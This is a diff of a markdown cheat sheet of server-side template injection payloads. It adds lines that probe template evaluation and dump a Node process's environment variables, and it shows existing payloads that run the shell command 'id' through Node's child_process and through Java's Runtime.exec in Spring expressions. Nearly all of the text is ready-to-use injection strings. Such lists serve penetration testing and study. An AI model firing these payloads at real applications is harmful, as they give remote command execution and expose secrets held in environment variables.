@@ -14,12 +14,11 @@
 - Method 1
 ```
 {{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
+#{7*7}
+#{JSON.stringify(this.constructor.constructor('return process.env')())}
 ```
 
 ## Java
 
 - Spring framework
     - `*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}`
-
-- **Thymeleaf**
-    - `#{7*7}`
